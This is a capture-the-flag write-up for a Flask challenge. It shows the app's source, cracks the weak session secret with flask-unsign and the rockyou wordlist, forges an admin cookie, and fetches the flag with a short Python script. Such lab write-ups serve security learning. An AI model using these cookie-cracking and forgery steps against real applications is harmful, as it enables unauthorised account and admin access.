---
title: "BackdoorCTF25 - Flask of cookies"
subtitle: "A tiny Flask app that looks harmless… or does it? Some things aren’t quite what they seem, especially the parts you can’t see. Take a closer look — maybe there’s a way to convince the system you’re someone else."
excerpt: "A tiny Flask app that looks harmless… or does it? Some things aren’t quite what they seem, especially the parts you can’t see. Take a closer look — maybe there’s a way to convince the system you’re someone else."
date: 2025-12-06
categories: [web]
tags: [flask, cookie]
ctfs: [backdoorctf25]
author_profile: true
sidebar:
  nav: "docs"
header:
  overlay_color: "#000"
---

# Recon

```
.
├── Dockerfile
├── app.py
├── docker-compose.yml
├── flag
├── requirements.txt
├── static
│   └── cookie.jpg
└── templates
    ├── admin.html
    └── index.html
```

We have a `Flask` web server that exposes a */admin* page on which the *flag* is displayed : 

```python
from flask import Flask, render_template, session
from dotenv import load_dotenv

load_dotenv() 
import os


app=Flask(__name__)

app.secret_key=os.environ["SECRET_KEY"]
flag_value =    open("./flag").read().rstrip()

def derived_level(sess,secret_key):
    user=sess.get("user","")
    role=sess.get("role","")
    if role =="admin" and user==secret_key[::-1]:
        return "superadmin"
    return "user"


@app.route("/")
def index():
    if "user" not in session:
        session["user"]="guest"
        session["role"]="user"
    return render_template("index.html")

@app.route("/admin")
def admin():
    level = derived_level(session,app.secret_key)
    if level == "superadmin":
        return render_template("admin.html",flag=flag_value)
    return "Access denied.\n",403



if __name__ == "__main__":
    app.run(host="0.0.0.0",port=8000,debug=False)
```

In order to access it, we must provide a cookie in which the `role` attribute is set to *admin*, and the `user` attribute to the inverse of a secret key. Therefore, it seems obvious that the secret key is crackable since it is mandatory to have its value in order to reach the flag.

# Investigations

We first query the target to get a session cookie : 

```
curl -i http://<challenge-host> | grep -i "Set-Cookie"
Set-Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXIiOiJndWVzdCJ9.aTfyiA.4z0Dpijgb9zZ2PJ8wvi8vVqp-MY; HttpOnly; Path=/
```

Then we use `flask-unsign` to crack the value of the secret key with `rockyou` : 
> https://github.com/Paradoxis/Flask-Unsign

```
~# flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --cookie "eyJyb2xlIjoidXNlciIsInVzZXIiOiJndWVzdCJ9.aTfyiA.4z0Dpijgb9zZ2PJ8wvi8vVqp-MY" --no-literal-eval
[*] Session decodes to: {'role': 'user', 'user': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 384 attempts
b'qwertyuiop'
```

The secret key is `qwertyuiop`, now we can forge the cookie and retrieve the flag :

```
~# flask-unsign --sign --cookie '{"role":"admin","user":"poiuytrewq"}' --secret 'qwertyuiop'
eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoicG9pdXl0cmV3cSJ9.aTf2-w.d53Rd3tTi4Q0nhMpX4Uyw8nxMWI
```

```python
import requests

cookies = {
	"session":"eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoicG9pdXl0cmV3cSJ9.aTf2-w.d53Rd3tTi4Q0nhMpX4Uyw8nxMWI"
}

print(requests.get("http://104.198.24.52:6011/admin.html", cookies=cookies).text)
```

```
~# python script.py | grep flag{
    <div class="flag-box">flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}</div>
```

> flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}
